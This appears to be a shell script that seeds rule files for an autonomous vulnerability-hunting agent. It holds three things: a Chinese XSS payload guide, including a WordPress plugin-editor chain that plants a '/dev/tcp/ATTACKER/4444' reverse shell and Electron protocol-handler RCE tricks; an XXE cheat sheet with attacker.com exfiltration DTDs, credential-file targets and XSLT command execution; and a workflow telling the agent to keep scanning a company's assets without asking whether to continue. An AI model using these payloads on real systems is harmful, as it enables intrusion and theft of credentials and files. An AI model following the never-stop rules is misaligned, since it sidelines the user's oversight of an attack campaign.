标签名随意（`c2xh` / `c2xl` 这种未知元素也能挂）。内联事件的作用域摸得到 `document`：`cookie` = `document.cookie`，`URL` = `document.URL`。拦 `document` / `alert(1)` 时用 `a=alert,a(cookie)` 或 `a=alert,a(URL)`。

不用点（`style` 还在时）：

```html
<c2xh oncontentvisibilityautostatechange=a=alert,a(cookie) style=display:block;content-visibility:auto>
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
```

未知标签被剥就换 `input` / `p`（或其它白名单标签）。`input` 上往往只要 `content-visibility:auto`，不必再写 `display:block`。`alert(1)` 能过就先过；拦了再换 `a=alert,a(cookie)`。

富文本 / BBCode / wiki 若把 `[p]`、`[[p]]`、`[div]` 转成对应 HTML 且属性原样带过去，直接挂在允许的标签上：

```
[[p oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto][/p]]
[div onmousemove=eval.call`${'al\x65rt(1)'}` style=position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999][/div]
```

`onmousemove` 要点/滑鼠标；`position:fixed` 铺满是为了鼠标一动就中。`eval.call\`...\`` 是标签模板调 `eval`；`\x65` 是 `e`，躲开字面 `alert`。自动事件能过就别用这条。

`onerror`/`onload` 被剥、自动事件也不走时，换指针事件 + 把元素撑大，鼠标一进就中（URL 编码常见）：

```
<svg%20id%3dmySvg%20onpointerenter%3da=alert,a(cookie)%20width%3d10000%20height%3d10000></svg>%2F%2F
```

解码即 `<svg id=mySvg onpointerenter=a=alert,a(cookie) width=10000 height=10000></svg>//`。末尾 `//` 注释掉注入点后面的残留。假点：没划进这张超大 svg；标签/事件被剥。

页面已经引入 Layui / animate.css 这类现成动画时，挂库里的 class，用 `onanimationstart` 自动开火，不用自己写 `@keyframes`：

```
[div class=layui-anim-up onanimationstart=javascript:alert(1)][/div]
```

事件处理里写 `javascript:alert(1)` 时，`javascript:` 是 JS 标签（label），后面的 `alert(1)` 照样跑，不是 URL 协议。假点：页面没有这段 CSS；class / 事件被剥；动画没播。

假点：只换标签名、属性被剥；转出来是纯文本；没滑鼠标；`style` 被剥只剩小块要精确悬停；CSP 禁 `eval`。前面的「Life：face」这类只是正文，不是 payload 的一部分。

`style` / `content-visibility` 被剥时换 Popover，要点一下按钮。`popovertarget` 对上 `id`，`onbeforetoggle` 在弹出前开火：

```html
<button popovertarget=x>Click me</button><c2xl onbeforetoggle=a=alert,a(URL) popover id=x>Go</c2xl>
```

Chrome / Edge 优先。Firefox、Safari 这两个 API 经常不响，换别的事件，这条不算死。Popover 那条没点按钮不算打穿。

## 8. XSS → RCE / 自定义协议（短表有指针）

### XSS → RCE（特权上下文，和上面偷 Cookie 是同一条链的升级）

存储/反射 XSS 打穿之后，或 Electron 自己把外站页拉进特权窗之后，问的是：**这段 JS 跑在谁的进程里**。网页里只是会话；落到能写插件、能调本机桥的地方才是 RCE。下面几条是同一类，不是互斥。

**网页后台（WordPress 等）**：管理员会话 + 能改插件/主题的编辑器。Hello Dolly 只是现成文件，别的可写入口一样打。

```javascript
p = '/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?=`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`;?>';
a = new XMLHttpRequest();
a.open('GET', p+q, 0); a.send();
$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + encodeURIComponent(s) + '&action=update&' + q;
b = new XMLHttpRequest();
b.open('POST', p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send($);
b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plugins/hello.php'); }
```

**桌面客户端（CEF / Electron / 企业 Git GUI）**：有 node 桥 / `nodeIntegration` / `enableRemoteModule` / 暴露的 `Buffer`·`require`·`child_process`，页面里的 JS 就在本机进程里跑。payload 按现场选（自动跳转、外链、事件、远程页），**不要死抄某一种 gadget**。沙箱死了 → 当普通存储 XSS 继续打网页，不宣布这条死。

投递 1（存储 XSS）：README、议题、评论里存的 HTML，客户端当网页渲。组员/邀请接口若只认数字 `user_id`，递增拉人即可（就是 `idor-test.md` 里已有的顺序 ID + 批量写）。对方克隆列表若不隔离，你的仓会出现在他客户端里，打开 README 即触发。拉人本身不是洞的主体，主体仍是客户端把 HTML 渲成了特权 XSS。

### 自定义协议 → RCE（短表有指针）

投递 2（自定义协议，不必先有存储 XSS）：客户端注册了自己的 scheme。macOS 看 `Info.plist` 的 `CFBundleURLSchemes`，Windows 看安装时写的协议，包里的 JS 搜 `setAsDefaultProtocolClient` / `open-url` / `second-instance`。协议参数里出现 `url`、`urlType`、`open`、`openUrl`、`webview`，就试把外站地址塞进去。两种常见形态（字段名跟现场走，不要死抄）：

- JSON：`scheme://app/open?params={"url":"http://attacker","urlType":1}`
- 扁平：`scheme://openUrl?url=http://attacker/exp.html`

浏览器地址栏或任意 `href` 打开，系统会问「要打开该应用吗」——对方点一次就算合理交互，不需要中间人。

攻击页先探桥，再弹计算器。不要因为 Electron 18+ 或没有 `remote` 就停。顺序：`typeof process` → `typeof require`（`require.toString()` 含 `native` 才当真）→ `window.require` → 没有再看预加载桥 / `window.electron.ipcRenderer`。`require` 能直接 `child_process` 就用它；只有老窗口才走：

```
const {remote} = require('electron');
remote.require('child_process').exec('open -a Calculator');
```

Windows 把命令换成 `calc`。预加载只露了 `ipcRenderer`、调不了命令 → 这条桥没打穿，别写成 RCE。

算成：本机弹出计算器 / 执行了你指定的无害命令。只在浏览器 alert、客户端不渲、只弹「打开应用」但不加载外站、或跳了但没执行 → 停在调起/存储 XSS，别写成 RCE。协议只开自家域、`require` 和 `remote` 都没有 → 这条投递到此为止，改打投递 1 或网页面。
TECH_XSS_TEST_EOF

seed_rule techniques/xxe-test.md <<'TECH_XXE_TEST_EOF'
# xxe

# XML External Entity Injection (XXE)


## 1. CLASSIC XXE PAYLOAD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

If `/etc/passwd` reflects in response → confirmed file read.

---

## 2. ATTACK SURFACE DISCOVERY

### Direct XML Inputs
- SOAP endpoints (`text/xml`, `application/soap+xml`)
- REST APIs accepting `application/xml`
- File upload: `.xlsx`, `.docx`, `.pptx` (Office Open XML)
- SVG uploads (SVG is XML)
- RSS/Atom feed parsers
- Web services with XML config import

### Non-Obvious XML Processing
Change `Content-Type` header on **any** JSON POST to:
```
Content-Type: application/xml
```
Then rewrite body as XML — many backends use dual-format parsers or auto-detect.

### PDF Generators
Some HTML→PDF tools (wkhtmltopdf, PrinceXML) execute SSRF via embedded URLs but also parse external entities in SVG/XML included in the HTML.

---

## 3. OOB (OUT-OF-BAND) XXE — CRITICAL

Use when direct entity reflection fails (server parses but doesn't echo entity content):

### Step 1: Blind detection
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/">]>
<root>&xxe;</root>
```
DNS/HTTP hit to collaborator → confirms XXE (even if no file content returned).

### Step 2: OOB file exfiltration via attacker-hosted DTD
**Attacker's server hosts a malicious DTD** at `http://attacker.com/evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
```

**Payload sent to target**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&exfiltrate;</root>
```
File contents appear in attacker's HTTP server request log.

### Step 3: Error-based OOB (alternative when HTTP blocked)
Use intentional error to leak data in error message:
```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///NONEXISTENT/%file;'>">
%eval;
%error;
```

---

## 4. XXE FILE READ TARGETS

**Linux**:
```
/etc/passwd
/etc/shadow  (requires root)
/etc/hosts
/proc/self/environ      ← environment variables (DB creds, API keys)
/proc/self/cmdline      ← process command line
/var/log/apache2/access.log  ← may contain passwords in URLs
/home/USER/.ssh/id_rsa  ← SSH private key
/home/USER/.aws/credentials ← AWS keys
/home/USER/.bash_history
```

**Windows**:
```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config    ← ASP.NET connection strings
C:\xampp\htdocs\wp-config.php    ← WordPress DB credentials
C:\Users\Administrator\.ssh\id_rsa
```

---

## 5. SVG XXE (file upload context)

When SVG uploads are accepted and served/processed:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
  <text font-size="16">&xxe;</text>
</svg>
```
Upload as `.svg` → `GET /uploads/file.svg` → file contents in response.

---

## 6. OFFICE FILE XXE (docx/xlsx/pptx)

Office files are ZIP archives containing XML. Inject into `[Content_Types].xml` or `word/document.xml`:

```bash
# Step 1: extract
unzip original.docx -d extracted/

# Step 2: edit word/document.xml — add malicious DTD
# Add after <?xml version="1.0" encoding="UTF-8" standalone="yes"?>:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Then use &xxe; inside document text

# Step 3: repackage
cd extracted && zip -r ../malicious.docx .
```

---

## 7. SOAP ENDPOINT XXE

SOAP requests parse XML by definition. Inject external entity into SOAP envelope:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <id>&xxe;</id>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

---

## 8. XXE → SSRF CHAIN

XXE external entity can point to internal HTTP endpoints (identical to SSRF):
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```
This combines XXE file read + SSRF into a single payload.

---

## 9. XInclude ATTACK

When server-side processes XInclude (import XML from another source), but you can't control the DOCTYPE:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

Works in: Apache Cocoon, Xerces-J, libxml2 with XInclude support enabled.

---

## 10. PROTOCOL HANDLERS IN XXE

```xml
<!-- HTTP (SSRF) -->
<!ENTITY xxe SYSTEM "http://internal.company.com/admin/">

<!-- File read -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- PHP wrapper (if PHP with libxml2) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!-- Decode base64 in response to get file contents -->

<!-- FTP (exfil / port scan) -->
<!ENTITY xxe SYSTEM "ftp://attacker.com:21/x">

<!-- Gopher (Redis, SMTP) -->
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/info%0d%0a">
```

---

## 11. BYPASSING DEFENSES

### Parser blocks DOCTYPE
Try XInclude (no DOCTYPE needed, see §9).

### Only allows specific XML schemas
If schema validation occurs: inject comments or CDATA after schema validation but before entity processing.

### Response encoding issues (binary in response)
Use PHP filter for base64:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### Network restrictions on OOB
Use DNS-only OOB via `SYSTEM "file://HASH.attacker.com"` — no HTTP required, DNS lookup leaks data.

---

## 12. QUICK DETECTION CHECKLIST

```
□ Find XML input point (or JSON→XML transformation)
□ Send basic entity: <!ENTITY xxe "test"> → &xxe; in body → does "test" reflect?
□ If yes → file read: SYSTEM "file:///etc/passwd"
□ If no reflection → OOB test via Collaborator URL
□ If OOB hit → set up attacker DTD for file exfiltration
□ Try SVG upload with XXE
□ Try Content-Type: application/xml on JSON endpoints
□ Try XInclude if DOCTYPE-based fails
```

---

## 13. LOCAL DTD INJECTION (BLIND XXE AMPLIFICATION)

When external entities are blocked but local DTD files exist on the server:

### Technique

```xml
<!-- Override an entity defined in a LOCAL DTD file -->
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

### Common Local DTD Paths

#### Linux

```
/usr/share/yelp/dtd/docbookx.dtd           # GNOME Help
/usr/share/xml/fontconfig/fonts.dtd         # Fontconfig
/usr/share/sgml/docbook/xml-dtd-*/docbookx.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd
/usr/share/struts/struts-config_1_0.dtd     # Apache Struts
/usr/share/nmap/nmap.dtd                    # Nmap
/opt/zaproxy/xml/alert.dtd                  # OWASP ZAP
```

#### Windows

```
C:\Windows\System32\wbem\xml\cim20.dtd            # WMI
C:\Windows\System32\wbem\xml\wmi20.dtd             # WMI
C:\Program Files\IBM\WebSphere\*.dtd               # WebSphere
C:\Program Files (x86)\Lotus\*.dtd                 # Lotus Notes
```

#### Inside JAR Files (Java Applications)

```
jar:file:///usr/share/java/tomcat-*.jar!/javax/servlet/resources/web-app_2_3.dtd
jar:file:///opt/wildfly/modules/*.jar!/org/jboss/as/*.dtd
file:///usr/share/java/struts2-core-*.jar!/struts-2.5.dtd
```

### Why This Works

- External connections blocked (firewall/WAF/egress filter)
- But file:// to LOCAL files is usually allowed
- Local DTD is trusted → entity overrides inject attacker-controlled definitions
- Error messages or blind extraction via file:// still works

---

## 14. ADDITIONAL OOB EXFILTRATION CHANNELS

### FTP-based exfiltration (line-by-line)

FTP protocol sends data line-by-line, making it useful for multi-line file exfiltration when HTTP-based OOB truncates at newlines:

```xml
<!-- attacker.com/ftp-exfil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:2121/%file;'>">
%exfil;
%send;
```

Run a rogue FTP server (e.g., `xxeserv` or custom Python) on port 2121 — each line of the file arrives as a separate `RETR` or `CWD` command.

### HTTP parameter exfiltration

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>">
%exfil;
%send;
```

Base64 encoding avoids newline/special-character issues in HTTP URL. Decode the `d=` parameter on attacker server.

---

## 15. DTD NESTING TRICKS — PARAMETER ENTITY CHAINING

### Parameter entity within parameter entity

Used to bypass parsers that block direct entity references in entity values:

```xml
<!DOCTYPE foo [
  <!ENTITY % a "&#x25; b;">
  <!ENTITY % b SYSTEM "http://attacker.com/chain.dtd">
  %a;
]>
```

The parser expands `%a;` → `%b;` → fetches external DTD. Some WAFs only inspect the first level of entity definitions.

### Triple-nested for filter evasion

```xml
<!-- attacker.com/stage1.dtd -->
<!ENTITY % s2 SYSTEM "http://attacker.com/stage2.dtd">
%s2;

<!-- attacker.com/stage2.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % s3 "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%s3;
%exfil;
```

Payload sent to target only references `stage1.dtd` — the actual file read happens two DTD fetches deep, evading shallow WAF inspection.

---

## 16. XXE IN NON-OBVIOUS FORMATS

| Format | XML Location | Injection Point |
|--------|-------------|-----------------|
| **SOAP Envelope** | Entire body is XML | Add DOCTYPE before `<soap:Envelope>` |
| **SVG Image** | SVG is XML | `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in SVG header |
| **OOXML (.docx)** | `word/document.xml`, `[Content_Types].xml` | Inject DOCTYPE + entity into any XML member |
| **OOXML (.xlsx)** | `xl/sharedStrings.xml`, `xl/worksheets/sheet1.xml` | Entity reference in cell values |
| **RSS/Atom feeds** | Feed body is XML | Inject into feed items if user content is included |
| **SAML assertions** | SAML XML tokens | DOCTYPE injection in `SAMLResponse` parameter (base64-decoded XML) |
| **XMPP** | Protocol messages are XML stanzas | Entity in message body or JID fields |
| **GPX files** | GPS track data in XML | Via file upload endpoints accepting GPX |
| **XHTML** | Strict XHTML is valid XML | DOCTYPE injection in XHTML documents |

### SAML XXE

```xml
<!-- Base64-decode the SAMLResponse, inject DOCTYPE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

Re-encode to base64, submit as `SAMLResponse` parameter.

---

## 17. XXE VIA FILE UPLOAD

### SVG upload

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="50" font-size="14">&xxe;</text>
</svg>
```

Upload as avatar/image → view uploaded SVG → file content rendered as text.

### XLSX (Excel) upload

```bash
# 1. Create minimal .xlsx, unzip it
unzip report.xlsx -d xlsx_tmp/

# 2. Inject into xl/sharedStrings.xml
# Add after XML declaration:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Replace a <t> element content with &xxe;

# 3. Repackage
cd xlsx_tmp && zip -r ../malicious.xlsx .
```

Alternatively inject into `[Content_Types].xml` (parsed first by most OOXML processors).

### DOCX upload

```bash
# Target: word/document.xml
# Same approach: unzip → inject DOCTYPE + entity → repackage

# Alternative: inject into customXml/item1.xml if custom XML parts exist
```

### Processing pipeline attack

Even if the uploaded file is not directly rendered, the server-side parser (Apache POI, python-docx, OpenXML SDK) may process entities during import, triggering OOB exfiltration.

---

## 18. ERROR-BASED XXE

Force the XML parser to generate an error message containing file content:

### Method 1: Non-existent file reference

```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser attempts to open `file:///nonexistent/<hostname_content>` → error message includes the hostname value.

### Method 2: XML schema validation error

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'jar:file:///nonexistent!/%file;'>">
  %eval;
  %err;
]>
```

The `jar:` protocol handler generates verbose error messages that include the expanded entity value.

### Method 3: Integer overflow / type error

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#x25; trick SYSTEM 'file:///%file;'>">
%int;
%trick;
```

Parser tries to open a file path containing the target file content → error message reveals content.

---

## 19. XSLT INJECTION CONNECTION TO XXE

XSLT processors parse XML and can be chained with XXE:

### XSLT file read

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XSLT RCE (processor-dependent)

```xml
<!-- Xalan-J (Java) -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj,'id')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- PHP (libxslt with registerPHPFunctions) -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XXE → XSLT chain

If the target accepts XML input with a stylesheet reference (`<?xml-stylesheet?>`), inject both an external entity and a malicious XSLT to escalate from file read to RCE.


---


## 附件：SCENARIOS

# XXE — Extended Scenarios & Real-World Cases

---

## 1. CVE Case: Apache Solr XXE + RCE (CVE-2017-12629)

Apache Solr's Config API accepts XML with external entity processing enabled, and the Velocity Response Writer allows template injection:

**XXE for file read**:
```
GET /solr/CORE/select?q=xxx&wt=xml&defType=edismax&echoParams=all&fl=id,name&sort=${jndi:ldap://attacker/x}
```

**Combined XXE + RCE chain**:
1. Use XXE to read Solr configuration and identify available cores
2. Use Config API to register a new VelocityResponseWriter with `solr.resource.loader.enabled=true`
3. Execute Velocity template with `Runtime.exec()`

---

## 2. Office Document XXE — Step-by-Step

OOXML files (`.docx`, `.xlsx`, `.pptx`) are ZIP archives containing XML:

```bash
# Step 1: Create a legitimate .docx
# Step 2: Extract
mkdir extracted && cd extracted
unzip ../document.docx

# Step 3: Inject XXE into word/document.xml
# Add after <?xml version="1.0"...?>:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Then replace a text element with &xxe;

# Step 4: Also try [Content_Types].xml:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/notify">]>

# Step 5: Repackage
zip -r ../malicious.docx .

# Step 6: Upload to target application
# If the app parses the XML → XXE triggers
```

**Common targets**: document preview, import functionality, file conversion services.

---

## 3. DOCTYPE-Based SSRF

Even when the application doesn't reflect entity values, `DOCTYPE` with `PUBLIC` or `SYSTEM` triggers an HTTP request:

```xml
<!DOCTYPE foo PUBLIC "-//attacker//DTD//EN" "http://attacker.com/notify">
<root>normal content</root>
```

The XML parser fetches the DTD from `attacker.com` — confirms SSRF even without entity reflection.

---

## 4. PHP expect:// Protocol via XXE

When PHP's `expect` extension is installed:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>
```

The `expect://` wrapper executes the command and returns output. Rare but devastating when available.

**Check availability**: `phpinfo()` → look for "expect" in loaded extensions.

---

## 5. XXE in SOAP Web Services

SOAP endpoints parse XML by design — always test for XXE:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser><id>&xxe;</id></getUser>
  </soap:Body>
</soap:Envelope>
```

Also test the `SOAPAction` header and WSDL import endpoints.

---

## 6. Blind XXE via Error Messages

When OOB HTTP exfiltration is blocked, use error-based exfiltration:

```xml
<!-- Hosted at attacker.com/error.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser tries to open `file:///nonexistent/root:x:0:0:...` → error message contains file contents.
TECH_XXE_TEST_EOF


seed_rule srcskill/dig-scope-workflow.md <<'SRC_DIG_SCOPE_WORKFLOW_EOF'
# 挖洞范围 · 锁面 / 自由跳（永久）

> **一律增强，不限制死**（与 `skill-as-boost` 同精神）。  
> **用户不应靠「很久没新报告」才发现空转** — Agent 必须自检纠偏，禁止用队列/日志装忙。  
> **单站类型矩阵** 与 `src-value-hunting.md` 一致，本文件不缩类型。  
> **进站打法**（§4.0 说清这摊 / §4.1 抽钥匙 / §4.1.3 回包线索 / §4.2.1 有差分面 / §4.2.3 有会话对象图 / 中危升链 / 肥瘦）：本文件第 4 节为准；类型探针密度认 `src-value` §3。  
> **自由跳：用户未主动叫停则一直挖；禁止中途问「要不要继续」。**  
> **一种子闭环（2026-08-16）：所有种子一律「搜一个 → 去重去废去非存活 → 剩下的挖完 → 才搜下一个」；禁止多种子一次搜完。**

---

## 0. 先判模式

| 用户指令 | 模式 | 行为摘要 |
|----------|------|----------|
| 模糊目标（只给集团名、没有 URL 清单），无固定 URL 清单 | **自由跳** | 种子尽能力多备 → 落盘队列 → **一种子闭环（搜一个→去重去废去非存活→剩下的挖完→才搜下一个）**；**禁止多种子一次搜完**；旧夹续挖跳过已挖已搜；全 done → 随机/回扫新增（§1） |
| 固定站 / 固定 URL / 文档 URL / URL 清单 | **锁面** | **不主动 FOFA 出圈**；资产簇内多 host、业务流子域、同 host 多 path **都要挖** |

原则：**没指定面 = 自由跳；指定了站/文档/清单 = 锁面。** 当次指令优先（当场说锁死 / 先别跳 → 压过默认）。

### 0.1 锁面口径（防锁太死 · 用户 2026-08-06）

锁的是 **「别偷偷变自由跳去全集团 FOFA」**，不是钉死入口字符串。

| 锁（禁止） | 不锁死（必须挖） |
|------------|------------------|
| 未进站就 FOFA/爆破扫全集团、无关事业部 | 入口自带/加载出的多个 host → 都挖 |
| 擅自跳到与当前资产无关的旁系域名 | 登录/点功能后子域、网关、API 域切换 → 跟业务流 |
| 文档当自由跳种子扩集团 | 同 host 多 path/接口全展；JS/配置带出的 **同产品业务 host** 纳入本轮 |

**算锁面内：** 用户入口 host；页面/JS/配置/响应里的业务 host；业务流自然跳到的子域/网关；同资产簇多 host。  
**算出圈：** 未进站 FOFA 全品牌；仅因「好像一家」开打无关产品线。  
**禁误解：** 锁面 ≠ hostname 字面一致才测；≠ 只测文档那一条 path；≠ 子域一变就停；文档默认锁面，用户另说挖某集团才是自由跳。

**锁面结束：** 当前资产簇本轮矩阵做完可停或短报；不是无限自由跳。

**锁面清单顺序（硬 · 防「一」磨登录墙、「重要」排后）：**

| 做 | 不做 |
|----|------|
| 用户自己标了「重要资产 / 优先」→ **先打那一组** | 把「一、二、三」当成必须从上往下清完第一节 |
| 「都要挖」= 轮都会轮到；同皮只留 2～3 代表（§3.3） | 清单第 1 条登录墙磨完验证码/默认口，才动 CDP / BI / LIMS |
| 登录壳同皮 → 登录表单不用再挖。代表站 §4.2.2 做过的，sibling 一眼差分（有没有新的重置 / 改绑 / 换票 path）；没有新口不另开全矩阵。仍比 `jump` / `service=` / `moduleId` 是不是另一个业务面（是就去挖） | 每个同皮 host 再开一套全矩阵；只比登录壳就整摊跳过 |

禁止把 §1.0.1「不要挑优质面把其余活 URL 扔了」（自由跳一种子）读成锁面必须按原文顺序全矩阵。

### 0.2 协作裁定（压过 researcher「等继续」）

| 语境 | 行为 |
|------|------|
| 自由跳模糊目标 | **不停、不问继续**；缺对比账号 → 降级测能测的，边挖边记 |
| 锁面 / 白盒 / 写代码 | 清单尽或跑前可按各文件约定汇报 |
| 真缺唯一技术前提且无法降级 | 极短报障后仍挖可挖面；**禁止**用提问当停工理由 |

---

## 1. 自由跳

### 1.0 一张图（起手必过）

```
模糊目标
  ├─ 桌面有 {目标}_SRC挖洞 且未清理？
  │     是 → 续挖：读 种子队列 + covered_hosts + 报告/ + dig STATE
  │           跳过 done/cold 种子与 covered host；从 pending 开干
  │     否 → 新开：建任务根；种子尽能力多备并落盘；顺序可洗牌
  │
  ├─ 知识库有对应 `*src经验.md`？有才开，没有不算缺
  │     有 → 和短表并行打开；新窗口也开。专篇=口径/死路簇，不是本站清单，不替代矩阵
  │
  ├─ 取种子 S（pending 优先；P2 备案先活筛）
  │     → 只搜这一个 S（FOFA/补池只围绕 S；本种子结果可翻页）
  │     → 出来的 URL：去重 → 去废 → 去非存活 → 百分百控股闸
  │     → 剩下的活面全部进站全矩阵（§4）→ 打成了按 format 落 `报告/`
  │     → 优质面带出的搜域 R 只回灌队列，本种子剩余活面没挖完不去搜 R（§1.1.1）
  │     → 本种子剩余活面全部挖完（或全废/死）→ 标 done → 才搜下一条 pending（不问继续）
  │
  └─ 队列全 done / covered 基本盖满 且用户未叫停？
        → 随机补关键词再搜  或  回扫旧种子只捞相对 covered 的新增 host
        → 工商/SRC 通了再增量补 4 级与新业务名
```

### 1.0.1 一种子闭环（硬 · 用户 2026-08-16）

> **所有种子一律这样，没有例外。**  
> **禁止**把队列里的种子一次搜完再挖。

```
取一个种子 S
  → 只搜这一个 S（FOFA/补池只围绕 S；本种子结果可翻页）
  → 出来的 URL：去重 → 去废（§3.1）→ 去非存活 → 股权闸（§3.2.0）
  → 剩下的活面全部挖完（每站过 §4.3，或记废/死/同皮跳过/已 covered）
  → 本种子才标 done → 才允许搜下一个种子
```

**禁止：**

| 禁止 | 说明 |
|------|------|
| 多种子连搜 / 一次搜完 | 先把队列 FOFA 一遍囤一大池，再回头挖 |
| 剩活面就换种搜 | 本种子清洗后还剩未挖活 URL，就开下一种子或回灌 R 的 FOFA |
| 误读「分批 FOFA」 | 「分批」只指 **这一种子** 的结果翻页，不是多种子连搜 |

**「挖完」是什么 / 不是什么：**

| 是 | 不是 |
|----|------|
| 清洗后剩下的每个该挖 `host:port` 都过了 §4.3（清单+矩阵+有差分面的四件套+§4.2.2；有会话再加 §4.2.3；瘦面一眼证伪），或已记废/非存活/同皮代表已做/同闸一眼差分（§4.1.2）/全局 covered | 宇宙级抠完每一个历史 path；80 个空壳各喷一轮 `'` |
| 进站后才发现死壳、403 空转、同皮 → 记过可跳该条，算处理完 | 挑两三个「优质面」矩阵一下，剩下活 URL 扔着去搜下一个种子 |
| 清洗后池空（全废/全死）→ 本种子立刻 done，马上搜下一条 | 本种子 FOFA 条数到手就算「搜完可以换种」 |

**去非存活（本种子搜完后必做，丢掉再挖）：**  
探不通 / 超时 / 停放页 / 无业务响应 = 非存活，不挖。  
401 / 403 / 登录墙 / 管理台挑战页 = **存活**，不要当死站丢掉。  
